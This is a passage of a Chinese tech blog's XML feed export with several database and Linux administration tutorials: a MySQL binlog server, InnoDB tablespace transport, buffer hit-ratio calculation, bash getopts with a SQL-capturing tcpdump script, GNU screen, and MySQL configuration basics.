$gte:1554048000, $lte:1555311600}}).count()2726271mgset-11469021:PRIMARY> db.antispam_resource.find({createTs: { $gte:1554048000, $lte:1555311600}}).count()2726271 终于导完 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL BINLOG Server]]></title>
    <url>%2F2019%2F04%2F03%2Fmysql-binlog-server%2F</url>
    <content type="text"><![CDATA[雷锋做了好事不留名，但是每一件事情都记到日记里面。 前言MySQL Binlog Server: 它使用 mysqlbinlog 命令以 daemon 进程的方式模拟一个 slave 的 IO 线程与主库连接，可以很方便地即时同步主库的 binlog，以便弥补定时备份策略中最近一次备份到下一次备份完成之前这段时间内的数据容易丢失的问题。 做好 MySQL 日志的备份，是数据安全的一个重要保证。以前通过写程序来实现，从 MySQL 5.6 出现以后，可以使用 mysqlbinlog 命令实现，不用写程序了。 权限创建复制账号1GRANT REPLICATION SLAVE ON *.* TO 'repl'@'%' IDENTIFIED BY 'repl'; 123mysql 5.7CREATE USER 'repl'@'%' IDENTIFIED BY 'repl';GRANT REPLICATION SLAVE ON *.* TO 'repl'@'%' 1FLUSH PRIVILEGES; 创建BINLOG SERVER1# mysqlbinlog -R --raw --host='192.168.199.230' --port=3306 --user='repl' --password='unixfbi' --stop-never --stop-never-slave-server-id=2313306 mysql-bin.000001 --result-file=/data/mysql/mysql3306/logs/ & 命令参数介绍： -R –read-from-remote-server :表示从远程机器上读取 binlog,要确保远程 mysql 存储，需要提供–host, –user, –password 参数; 使用该选项时，mysqlbinlog 会伪装成一个 slave，连接读取，请求指定的 binlog file，主库获取接收到这个请求之后就创建一个 binlog dump 线程推送 binlog 给 mysqlbinlog server。 –raw: 以 binlog 格式存储日志，方便后期使用; –host: 远程库的主机 IP 或者主机名; –port: 远端库的端口号; –user: 远程库上用于复制的账号; –password: 远端库上复制账号的密码; –stop-never: 一直连接到远程的 server 上读取 binlog 日志，直接到远程的 server 关闭后才会退出。或是被 pkill 掉; –stop-never-slave-server-id: 如果需要启动多个 binlog server ，需要给 binlog server 指定 server-id 。如果需要启动多个 binlog server,需要给 binlog server 指定 server-id(默认是 65535)，可以利用 –stop-never-slave-server-id 变更; mysql-bin.0000001 这个日志名表示从那个日志开始读取; –result-file: 指定存储到本地的目录，注意后缀需要加上/，否则 mysqlbinlog 命令会认为是保存文件的前缀。若指定了–raw 参数，-r 的值指定 binlog 的存放目录和文件名前缀；若没有指定–raw 参数，-r 的值指定文本存放的目录和文件名。 注意： 使用–raw 连接 master 时，以 4k 为单位写入磁盘。并不能实时写入磁盘。那么不够 4k 时，binlog server 什么时候才会把日志写入磁盘呢？ 有两种情况： 第一：binlog server 和主库断开时， 第二：master 执行 flush logs 都会实时把日志写入磁盘。 mysqlbinlog raw 有一个 4k 的 Buffer ，够 4k 就发车。 设置 mysqlbinlog 为守护进程如果 master 重启的话，binlog server 上的 mysqlbinlog 进程就会退出，所以我们写个脚本把 mysqlbinlog 设置为守护进程方式运行1234567891011121314151617181920212223242526#!/bin/bash BACKUP_BIN=/usr/local/mysql/bin/mysqlbinlogLOCAL_BACKUP_DIR=/data/mysql/mysql3306/logs/BACKUP_LOG=/tmp/backup.logREMOTE_HOST=192.168.199.230REMOTE_PORT=3306REMOTE_USER=replREMOTE_PASS=unixfbiFIRST_BINLOG=mysql-bin.000001SLAVE_SERVER_ID=2313306# wait for 10sSLEEP_SECONDS=10cd ${LOCAL_BACKUP_DIR}while :do if [ `ls -A "${LOCAL_BACKUP_DIR}" |wc -l` -eq 0 ];then LAST_FILE=${FIRST_BINLOG} else LAST_FILE=`ls -l ${LOCAL_BACKUP_DIR} |tail -n 1 |awk '{print $NF}'` fi ${BACKUP_BIN} --raw -R --stop-never --host=${REMOTE_HOST} --port=${REMOTE_PORT} --user=${REMOTE_USER} --password=${REMOTE_PASS} --stop-never --stop-never-slave-server-id=${SLAVE_SERVER_ID} ${LAST_FILE} --result-file=${LOCAL_BACKUP_DIR} echo "`date +"%Y/%m/%d %H:%M:%S"` mysqlbinlog is stoped,return code: $?" | tee -a ${BACKUP_LOG} echo "${SLEEP_SECONDS}s will continue !" | tee -a ${BACKUP_LOG} sleep ${SLEEP_SECONDS}done 执行脚本1# nohup binlog_cp.sh & 参考UnixFBI 运维特工 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL Innodb表空间传输]]></title>
    <url>%2F2019%2F04%2F03%2Finnodb-tablespace-copying%2F</url>
    <content type="text"><![CDATA[不吃饱哪有力气减肥啊。 innodb表空间传输，是MySQL5.6开始加入的新特性，支持普通表空间拷贝到其他实例下，MySQL5.7支持分区表的表空间传输，使innodb表的拷贝变得更加简单容易。 方便是方便了，但也要需要注意: innodb表空间传输不要用来做主从复制，否则会出现数据不一致的问题; 使用之前，要确认使用了innodb_file_per_table即独立表空间; 在表空间导出的过程中，事务不能进行写操作, 应该注意选择操作时间, 应该选择业务低峰期操作; 默认不支持导出有外键的表, 可以通过set foreign_key_checks=0强制忽略, 但仅限于普通表, 而分区表暂时不支持这样操作。 我们知道了innodb表空间传输的特点和使用注意事项, 现在考虑一下应用场景。因为不做主从复制，就只能做一些离线方面的使用，比如把线上某个生产表拿到离线环境做统计分析等等。 下面介绍innodb普通表空间传输和分区表空间传输的操作过程1.innodb普通表空间传输 1.1目标库123mysql> create table t2(id int auto_increment, name varchar(20), primary key(id));mysql> insert into t2(name) values('aa'),('bb'),('cc');mysql> alter table t2 discard tablespace; 1.2 源库12345mysql> flush tables t2 for export;shell> scp -P2222 /data/mysql/mysql_3306/data/db1/t2.{cfg,ibd} 172.16.123.103:/data/mysql/mysql_3306/data/test/mysql> unlock tables; 1.3 目标库123shell> chown mysql.mysql /data/mysql/mysql_3306/data/test/t2.*mysql> alter table t2 import tablespace; 2.innodb分区表空间传输测试分区表结构1mysql> create table t3(id int auto_increment, name varchar(20), primary key(id)) partition by key(id) partitions 4; 2.1 目标库1mysql> create table t3(id int auto_increment, name varchar(20), primary key(id)) partition by key(id) partitions 4; 插入测试数据(省略)2.2 源库12345mysql> flush tables t3 for export; #导出整个分区表shell> cp -a /data/mysql/mysql_3306/data/db1/t3* /var/tmp/mysql> unlock tables; 2.3 目标库 2.3.1 导入全数分区1234目标库mysql> alter table t3 discard tablespace;或mysql> alter table t3 discard partition all tablespace; 123源库shell> scp -P2222 -r t3* 172.16.123.103:/data/mysql/mysql_3306/data/test/shell> chown mysql.mysql /data/mysql/mysql_3306/data/test/ -R 12目标库mysql> alter table t3 import tablespace; 2.3.2 导入指定分区只导p1分区12目标库mysql> alter table t3 discard partition p1 tablespace; 12源库shell> scp -P2222 -r t3p1 172.16.123.103:/data/mysql/mysql_3306/data/test/ 12目标库mysql> alter table t3 import partition p1 tablespace; 总结源库上flush tables tbname for export;—>拷贝文件–>unlock tables; 目标库上alter table tbname discard [partition partition_names | ALL] tablespace;–>拷贝文件过来,改权限–>alter table tbname IMPORT [PARTITION partition_names | ALL] TABLESPACE; 再次提醒 做flush tables xx discard tablespace之前，务必三思, 一定要搞清楚在哪个库操作, 万一在生产库上操作，这就悲剧了! 转载Huang Jinqiang document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从MySQL源码学习运维Innodb buffer命中率计算]]></title>
    <url>%2F2019%2F04%2F03%2Fmysql-innodb-buffer-pool-hit%2F</url>
    <content type="text"><![CDATA[天没降大任于我，照样苦我心智，劳我筋骨。 计算公式按官方手册推荐Innodb buffer Hit Ratios的计算是:123100-((iReads / iReadRequests)*100)iReads : mysql->status->Innodb_buffer_pool_readsiReadRequests: mysql->status->Innodb_buffer_pool_read_requests mysqlsqlreport中关于buffer命中计算是:1ib_bp_hit=100-(Innodb_buffer_pool_reads/Innodb_buffer_pool_read_requests)*100 另外我们知道查看Innodb Buffer Hit Ratios的地方是:12show engine innodb status\G;Buffer pool hit rate : XXXX/1000; 那个XXX/1000即是buffer pool hit ratios的命中. innodb buffer hit Ratios的命中计算需要本次取的值和上次值做一个减法公式应该为1ib_bp_hit=1000 – (t2.iReads – t1.iReads)/(t2.iReadRequest – t1.iReadRequest)*1000 t(n): 时间点 两个时间间隔最少是30秒以上,在小意义不大. iReads: Innodb_buffer_pool_reads iReadRequest: Innodb_buffer_pool_read_requests 思考:对于innodb_buffer_pool_read_requests, innodb_buffer_pool_reads这种累加值,当很大时进行: innodb_buffer_pool_reads/innodb_buffer_pool_read_requests 相来讲只能得到从开始到现在的命中率的表现了. 如果想得到现在近五分钟,近一分钟或是8点到9点每分钟的命中率情况,如果还是按着innodb_buffer_pool_reads/innodb_buffer_pool_read_requests 进行计算,只能得到mysqld开起累计在8点-9点的每分钟的累计平均命中情况. 所以如果想到每(五)分钟的命中情况,就需要本次取得的值和一(五)分钟前的值进行相减,然后进行运算.这样才能得到一个当下的bp命中情况. 两种方法没实质的对错的问题,但相对于源码中的那种计算方式更容让发现数据库的抖动问题. 能解决的问题: 偶而的数据库性能抖动能直观的反应出来. 转载吴 炳锡(数据库架构师):从MySQL源码学习运维Innodb buffer命中率计算 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux中SHELL内置getopts命令获取命令行参数]]></title>
    <url>%2F2019%2F04%2F03%2Fshell-getopts%2F</url>
    <content type="text"><![CDATA[做人如果没有梦想，那和咸鱼有何区别？ 前言写程序的时候经常要处理命令行参数，本文描述在Bash下的命令行处理方式。 选项与参数: 如下一个命令行:1/test.sh -f config.conf -v --prefix=/home 我们称-f为选项，它需要一个参数，即config.conf, -v 也是一个选项，但它不需要参数。 –prefix我们称之为一个长选项，即选项本身多于一个字符，它也需要一个参数，用等号连接，当然等号不是必须的，/home可以直接写在–prefix后面，即–prefix/home,更多的限制后面具体会讲到。 在bash中，可以用以下三种方式来处理命令行参数，每种方式都有自己的应用场景。 手工处理方式 getopts getopt 由于shell命令行的灵活性，自己编写代码判断时，复杂度会比较高。使用内部命令 getopts 可以很方便地处理命令行参数。一般格式为： 调用格式：1getopts options variable getopts 的设计目标是在循环中运行，每次执行循环，getopts 就检查下一个命令行参数，并判断它是否合法。即检查参数是否以 - 开头，后面跟一个包含在 options 中的字母。如果是，就把匹配的选项字母存在指定的变量 variable 中，并返回退出状态0；如果 - 后面的字母没有包含在 options 中，就在 variable 中存入一个 ？，并返回退出状态0；如果命令行中已经没有参数，或者下一个参数不以 - 开头，就返回不为0的退出状态。 参数说明： option_string 选项名称 variable 选项的值 选项之间使用冒号:分隔，也可以直接连接， : 表示选项后面有传值。 当getopts命令发现冒号后，会从命令行该选项后读取该值。如该值存在，将保存在特殊的变量OPTARG中。 当option_string用:开头，getopts会区分invalid option错误和miss option argument错误。 invalid option时, varname会被设成? miss option argument时，varname会被设成: 如果option_string不用:开头，invalid option错误和miss option argument错误都会使varname被设成?。 getopts包含两个内置变量，OPTARG和OPTIND OPTARG 保存选项后的参数值 OPTIND 表示命令行下一个选项或参数的索引 使用示例例子1: 使用getopts命令获取参数123456789101112131415161718#!/bin/bashwhile getopts a:b:c:d opts; do case $opts in a) a=$OPTARG ;; b) b=$OPTARG ;; c) c=$OPTARG ;; d) d=$OPTARG ;; ?) ;; esacdoneecho "a=$a"echo "b=$b"echo "c=$c"echo "d=$d"exit 0 执行输出12345./test.sh -a 1 -b 2 -c 3 -d 4a=1b=2c=3d= option_string a🅱c:d a,b,c后都有: d后没有: 所以可以获取到a,b,c的值 例子2: option_string前加:上例中，如果a,b,c任意一个没有传值，将会提示出错。例如 -c 不传值。123456./test.sh -a 1 -b 2 -c./test.sh: option requires an argument -- ca=1b=2c=d= 我们在option_string前加上:，则可以屏蔽这个错误123456789101112131415161718#!/bin/bashwhile getopts :a:b:c:d opts; do case $opts in a) a=$OPTARG ;; b) b=$OPTARG ;; c) c=$OPTARG ;; d) d=$OPTARG ;; ?) ;; esacdoneecho "a=$a"echo "b=$b"echo "c=$c"echo "d=$d"exit 0 执行输出12345./test.sh -a 1 -b 2 -ca=1b=2c=d= 在option_string前加上:，可以屏蔽缺失传值的错误，但如果缺失的是前面选项的值，那么获取到的值将会错误。 例如缺失a的传值，命令会把-a后的-b作为了-a的值，导致错误。12345./test.sh -a -b 2 -c 3a=-bb=c=d= 因此使用getopts命令时，对于没有传值的选项，选项名称也不要加入命令行中。例如a不传值，则-a不要加入命令行。12345./test.sh -b 2 -c 3a=b=2c=3d= SHELL 代码以上是示例，下面贴上我写的脚本代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/bin/bash## Author: Created by jiemin.wang# QQ: 278667010# E-mail: 278661010@qq.com or wangjiemin880228@gmail.com# Created Time: Wed Apr 3 14:15:12 CST 2019# function: This is tcpdump grabs SQL executed by MySQL# version: 1.0function usage(){ echo "Usage:" echo " $(basename $0) [OPTION]:" echo " -n net" echo " -P port"}if [ $# -eq "0" ];then usage exit 1fiwhile getopts :n:P: argdo case $arg in n) net=$OPTARG ;; P) port=$OPTARG ;; esacdone#tcpdump -i "$net" -s 0 -l -w - dst port "$port" | strings | perl -e 'tcpdump -i "$net" -s 0 -l -w file dst port "$port" | strings | perl -e '#!/bin/bashwhile() { chomp; next if /^[^ ]+[ ]*$/; if(/^(SELECT|UPDATE|DELETE|INSERT|SET|COMMIT|ROLLBACK|CREATE|DROP|ALTER|CALL)/i) { if (defined $q) { print "$q\n"; } $q=$_; } else { $_ =~ s/^[ \t]+//; $q.=" $_"; }}' 其他示例在网上找了一个示例,贴上来,仅供参考1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/bin/bash QUIET=VERBOSE=DEVICE=LOGFILE=/tmp/defaultusage(){ echo "Usage: `basename $0` [-qv] [-l LOGFILE] -d DEVICE input_file [input_file2...]" exit 1}[ $# -eq 0 ] && usage#option_string以冒号开头表示屏蔽脚本的系统提示错误，自己处理错误提示。#后面接合法的单字母选项，选项后若有冒号，则表示该选项必须接具体的参数while getopts :qvd:l: OPTIONdo case $OPTION in q) QUIET=y ;; v) VERBOSE=y ;; d) DEVICE=$OPTARG #$OPTARG为特殊变量，表示选项的具体参数 ;; l) LOGFILE=$OPTARG ;; \?) #如果出现错误，则解析为? usage ;; esacdone#$OPTIND为特殊变量，表示第几个选项，初始值为1shift $(($OPTIND - 1)) #除了选项之外，该脚本必须接至少一个参数if [ $# -eq 0 ]; then usagefiif [ -z "$DEVICE" ]; then #该脚本必须提供-d选项 echo "You must specify DEVICE with -d option" exitfiecho "you chose the following options.."echo "Quiet=$QUIET VERBOSE=$VERBOSE DEVICE=$DEVICE LOGFILE=$LOGFILE"for file in $@ #依次处理剩余的参数do echo "Processing $file"done document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux 技巧：使用 screen 管理你的远程会话]]></title>
    <url>%2F2019%2F04%2F02%2Flinux-screen%2F</url>
    <content type="text"><![CDATA[有本事，你来顺着网线爬过来，你来咬我呀 前言你是不是经常需要 SSH 或者 telent 远程登录到 Linux 服务器？你是不是经常为一些长时间运行的任务而头疼，比如系统备份、ftp 传输等等。通常情况下我们都是为每一个这样的任务开一个远程终端窗口，因为他们执行的时间太长了。必须等待它执行完毕，在此期间可不能关掉窗口或者断开连接，否则这个任务就会被杀掉，一切半途而废了。 元凶：SIGHUP 信号让我们来看看为什么关掉窗口/断开连接会使得正在运行的程序死掉。 在Linux/Unix中，有这样几个概念: 进程组（process group）：一个或多个进程的集合，每一个进程组有唯一一个进程组ID，即进程组长进程的ID。 会话期（session）：一个或多个进程组的集合，有唯一一个会话期首进程（session leader）。会话期ID为首进程的ID。 会话期可以有一个单独的控制终端（controlling terminal）。与控制终端连接的会话期首进程叫做控制进程（controlling process）。当前与终端交互的进程称为前台进程组。其余进程组称为后台进程组。 根据POSIX.1定义: 挂断信号（SIGHUP）默认的动作是终止程序。 当终端接口检测到网络连接断开，将挂断信号发送给控制进程（会话期首进程）。 如果会话期首进程终止，则该信号发送到该会话期前台进程组。 一个进程退出导致一个孤儿进程组中产生时，如果任意一个孤儿进程组进程处于STOP状态，发送SIGHUP和SIGCONT信号到该进程组中所有进程。 因此当网络断开或终端窗口关闭后，控制进程收到SIGHUP信号退出，会导致该会话期内其他进程退出。 我们来看一个例子。打开两个SSH终端窗口，在其中一个运行top命令。1test_dbs2 ~ # top 在另一个终端窗口，找到top的进程ID为15371，其父进程ID为10034，即登录shell。1test_dbs2 ~ # ps -ef|grep top 12345root 5 2 0 Apr01 ? 00:00:00 [stopper/0]root 8 2 0 Apr01 ? 00:00:00 [stopper/1]root 15371 10034 0 18:37 pts/1 00:00:00 toproot 15380 15352 0 18:37 pts/2 00:00:00 grep --colour=auto toptest_dbs2 ~ # 使用pstree命令可以更清楚地看到这个关系：123test_dbs2 ~ # pstree -H 15371|grep top | |-sshd---sshd---bash---sudo---bash---sudo---bash---toptest_dbs2 ~ # 使用ps-xj命令可以看到，登录shell（PID 15371）和top在同一个会话期，shell为会话期首进程，所在进程组PGID为15371，top所在进程组PGID为9410，为前台进程组。12345678test_dbs2 ~ # ps -xj|grep 15371Warning: bad syntax, perhaps a bogus '-'? See /usr/share/doc/procps-3.2.8/FAQ 9410 10020 10020 9410 pts/1 15371 S 0 0:00 sudo bash10020 10021 10021 9410 pts/1 15371 S 0 0:00 bash10021 10033 10033 9410 pts/1 15371 S 0 0:00 sudo bash10033 10034 10034 9410 pts/1 15371 S 0 0:00 bash10034 15371 15371 9410 pts/1 15371 S+ 0 0:00 top15352 15485 15484 15327 pts/2 15484 R+ 0 0:00 grep --colour=auto 15371 关闭第一个SSH窗口，在另一个窗口中可以看到top也被杀掉了。123test_dbs2 ~ # ps -ef|grep 15371root 15511 15352 0 18:42 pts/2 00:00:00 grep --colour=auto 15371test_dbs2 ~ # 如果我们可以忽略SIGHUP信号，关掉窗口应该就不会影响程序的运行了。nohup命令可以达到这个目的，如果程序的标准输出/标准错误是终端，nohup默认将其重定向到nohup.out文件。值得注意的是nohup命令只是使得程序忽略SIGHUP信号，还需要使用标记&把它放在后台运行。1nohup [argument…] & 虽然nohup很容易使用，但还是比较“简陋”的，对于简单的命令能够应付过来，对于复杂的需要人机交互的任务就麻烦了。 其实我们可以使用一个更为强大的实用程序screen。流行的Linux发行版（例如Red Hat Enterprise Linux ） 通常会自带screen实用程序，如果没有的话，可以从GNU screen的官方网站下载。 开始使用Screen简单来说，Screen是一个可以在多个进程之间多路复用一个物理终端的窗口管理器。Screen中有会话的概念，用户可以在一个screen会话中创建多个screen窗口，在每一个screen窗口中就像操作一个真实的telnet/SSH连接窗口那样。在screen中创建一个新的窗口有这样几种方式：1234567891011121314151617181920212223242526272829303132333435363738test_dbs2 ~ # yum install -y screentest_dbs2 ~ # test_dbs2 ~ # screen --helpUse: screen [-opts] [cmd [args]] or: screen -r [host.tty]Options:-4 Use IPv4.-6 Use IPv6.-a Force all capabilities into each window's termcap.-A -[r|R] Adapt all windows to the new display width & height.-c file Read configuration file instead of '.screenrc'.-d (-r) Detach the elsewhere running screen (and reattach here).-dmS name Start as daemon: Screen session in detached mode.-D (-r) Detach and logout remote (and reattach here).-D -RR Do whatever is needed to get a screen session.-e xy Change command characters.-f Flow control on, -fn = off, -fa = auto.-h lines Set the size of the scrollback history buffer.-i Interrupt output sooner when flow control is on.-l Login mode on (update /var/run/utmp), -ln = off.-list or -ls. Do nothing, just list our SockDir.-L Turn on output logging.-m ignore $STY variable, do create a new screen session.-O Choose optimal output rather than exact vt100 emulation.-p window Preselect the named window if it exists.-q Quiet startup. Exits with non-zero return code if unsuccessful.-r Reattach to a detached screen process.-R Reattach if possible, otherwise start a new session.-s shell Shell to execute rather than $SHELL.-S sockname Name this session .sockname instead of ...-t title Set title. (window's name).-T term Use term as $TERM for windows, rather than "screen".-U Tell screen to use UTF-8 encoding.-v Print "Screen version 4.00.03 (FAU) 23-Oct-06".-wipe Do nothing, just clean up SockDir.-x Attach to a not detached screen. (Multi display mode).-X Execute as a screen command in the specified session. 直接在命令行键入screen命令1test_dbs2 ~ # screen 或者添加一个名称为mysqldump1test_dbs2 ~ # screen -S mysqldump 之后我们想暂时退出做点别的事情，比如出去散散步，那么在screen窗口键入C-a d，Screen会给出detached提示： 暂时中断会话 半个小时之后回来了，找到该screen会话：1test_dbs2 ~ # screen -ls 重新连接会话：123test_dbs2 ~ # screen -r -S mysqldump#或者test_dbs2 ~ # screen -r 16582 看看出现什么了，太棒了，一切都在。继续干吧。 你可能注意到给screen发送命令使用了特殊的键组合C-a。这是因为我们在键盘上键入的信息是直接发送给当前screen窗口，必须用其他方式向screen窗口管理器发出命令，默认情况下，screen接收以C-a开始的命令。这种命令形式在screen中叫做键绑定（key binding），C-a叫做命令字符（command character）。 可以通过C-a ?来查看所有的键绑定，常用的键绑定有： C-a ? 显示所有键绑定信息 C-a w 显示所有窗口列表 C-a C-a 切换到之前显示的窗口 C-a c 创建一个新的运行shell的窗口并切换到该窗口 C-a n 切换到下一个窗口 C-a p 切换到前一个窗口(与C-a n相对) C-a 0..9 切换到窗口0..9 C-a a 发送 C-a到当前窗口 C-a d 暂时断开screen会话 C-a k 杀掉当前窗口 C-a [ 进入拷贝/回滚模式 使用键绑定C-a ?命令可以看到, 默认的命令字符（Command key）为C-a，转义C-a（literal ^a）的字符为a： 如果由于某种原因其中一个会话死掉了（例如人为杀掉该会话），这时screen -list会显示该会话为dead状态。使用screen -wipe命令清除该会话：123test_dbs2 ~ # kill -9 8462test_dbs2 ~ # screen -wipetest_dbs2 ~ # screen -ls document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL 优化原理(三)]]></title>
    <url>%2F2019%2F03%2F29%2Fmysql-optimization-principle-3%2F</url>
    <content type="text"><![CDATA[戴上它。都几十岁的人了，你看你多贱，你没尊严啊？我不想看见你，快点戴上，然后去看医生。 前言聊聊 MySQL 配置。 大多数开发者可能不太会关注 MySQL 的配置，毕竟在基本配置没有问题的情况下，把更多的精力放在 schema 设计、索引优化和 SQL 优化上，是非常务实的策略。这时，如果再花力气去优化配置项，获得的收益通常都比较小。更多的时候，基于安全因素的考量，普通开发者很少能够接触到生产环境的 MySQL 配置。正是这样，导致开发者（包括我）对 MySQL 的配置不甚了解，希望本文能帮你更好的了解 MySQL 配置。 如果让你在某种环境上安装配置 MySQL，你会怎么做？安装后，直接 copy 修改示例配置文件，应该是大多数人的做法。但强烈建议不要怎么做，首先，示例配置文件有非常多注释掉的配置项，它可能会诱使你打开一个你并不了解的配置，而且这些注释还不一定准确。其次，MySQL 的一些配置对于现代化的硬件和工作负载来说，有点过时了。 MySQL 有非常多的配置项可以修改，但大多数情况下，你都不应该随便修改它，因为错误或者没用的配置导致的潜在风险非常大，而且还很难定位问题。确保基本配置正确，然后小心诊断问题，确认问题恰好可以通过某个配置项解决，紧接着再修改这个配置吧。 其实，创建一个好的配置，最快方法不是从学习配置项开始，也不是问哪个配置项应该怎么设置或者怎么修改开始，更不是从检查服务器行为和询问哪个配置项可以提升性能开始。最好是从理解 MySQL 内核和行为开始，然后利用这些知识来指导你配置 MySQL。 就从理解 MySQL 配置的工作原理开始吧。 MySQL 配置的工作原理MySQL 从哪儿获得配置信息：命令行参数和配置文件。类 Unix 系统中，配置文件一般位于 /etc/my.cnf 或者 /etc/mysql/my.cnf。在启动时，可以通过命令行参数指定配置文件的位置，当然命令行中也可以指定其它参数，服务器会读取配置文件的内容，删除所有注释和换行，然后和命令行选项一起处理。 任何打算长期使用的配置项都应该写入配置文件，而不是在命令行中指定。一定要清楚的知道 MySQL 使用的配置文件位置，在修改时不能想当然，比如，修改了 /etc/my.cnf 的配置项，但 MySQL 实际并未使用这个配置文件。如果你不知道当前使用的配置文件路径，可以尝试：12345$ which mysqld/usr/sbin/mysqld$ /usr/sbin/mysqld --verbose --help |grep -A 1 'Default options'Default options are read from the following files in the given order:/etc/my.cnf /etc/mysql/my.cnf ~/.my.cnf 一个典型的配置文件包含多个部分，每个部分的开头是一个方括号括起来的分段名称。MySQL 程序通常读取跟它同名的分段部分，比如，许多客户端程序读取[client]部分。服务器通常读取[mysqld]这一段，一定要确认配置项放在了文件正确的分段中，否则配置是不会生效的。 MySQL 每一个配置项均使用小写，单词之间用下划线或者横线隔开，虽然我们常用的分隔符是下划线，但如果在命令行或者配置文件中见到如下配置，你要知道，它们其实是等价的：123456# 配置文件max_connections=5000max-connections=5000# 命令行/usr/sbin/mysqld --max_connections=5000/usr/sbin/mysqld --max-connections=5000 配置项可以有多个作用域：全局作用域、会话作用域 (每个连接作用不同)、对象作用域。很多会话级配置项跟全局配置相等，可以认为是默认值，如果改变会话级配置项，它只影响改动的当前连接，当连接关闭时，所有的参数变更都会失效。下面有几个示例配置项： query-cache-size 全局配置项 sort-buffer-size 默认全局相同，但每个线程里也可以设置 join-buffer-size 默认全局，且每个线程也可以设置。但若一个查询中关联多张表，可以为每个关联分配一个关联缓存 (join-buffer)，所以一个查询可能有多个关联缓冲。 配置文件中的变量 (配置项) 有很多 (但不是所有) 可以在服务器运行时修改，MySQL 把这些归为动态配置变量：12345678910111213141516-- 设置全局变量，GLOBAL和@@global作用是一样的set GLOBAL sort-buffer-size = set @@global.sort-buffer-size := -- 设置会话级变量，下面6种方式作用是一样的-- 即：没有修饰符、SESSION、LOCAL等修饰符作用是一致的set SESSION sort-buffer-size = set @@session.sort-buffer-size := set @@sort-buffer-size = set LOCAL sort-buffer-size = set @@ocal.sort-buffer-size := set sort-buffer-size = -- set命令可以同时设置多个变量，但其中只要有一个变量设置失败，所有的变量都未生效SET GLOBAL sort-buffer-size = 100, SESSION sort-buffer-size = 1000;SET GLOBAL max-connections = 1000, sort-buffer-size = 1000000; 动态的设置变量，MySQL 关闭时这些变量都会失效。如果在服务器运行时修改了变量的全局值，这个值对当前会话和其他任何已经存在的会话都不起效果，这是因为会话的变量值是在连接创建时从全局值初始化而来的。注意，在配置修改后，需要确认是否修改成功。 你可能注意到，上面的示例中，有些使用 ‘=’，有些使用 ‘:=’。对于 set 命令本身来说，两种赋值运算符没有任何区别，在命令行中使用任一运算符符，均可以生效。而在其他语句中，赋值运算符必须是 ‘:=’，因为在非 set 语句中 ‘=’ 被视为比较运算符。具体可以参考如下示例： 详细示例可以参考：12345678910-- @exp 表示用户变量，上面的示例均是系统变量-- 错误set @user = 123456;set @group = select GROUP from USER where User = @user;select * from USER where GROUP = @group;-- 正确SET @user := 123456;SELECT @group := `group` FROM user WHERE user = @user;SELECT * FROM user WHERE `group` = @group; 有一些配置使用了不同的单位，比如table-cache变量指定表可以被缓存的数量，而不是表可以被缓存的字节数。而key-buffer-size则是以字节为单位。 还有一些配置可以指定后缀单位，比如1M=10241024字节，但需要注意的是，这只能在配置文件或者作为命令行参数时有效。当使用 SQL 的 SET 命令时，必须使用数字值 1048576 或者 10241024 这样的表达式，但在配置文件中不能使用表达式。 小心翼翼的配置 MySQL我们常常动态的修改配置，但请务必小心，因为它们可能导致数据库做大量耗时的工作，从而影响数据库的整体性能。比如从缓存中刷新脏块，不同的刷新方式对 I/O 的影响差别很大 (后文会具体说明)。最好把一些好的习惯作为规范合并到工作流程中去，就比如： 好习惯 1：不要通过配置项的名称来推断一个变量的作用 不要通过配置项的名称来推断一个变量的作用，因为它可能跟你想象的完全不一样。比如： read-buffer-size：当 MySQL 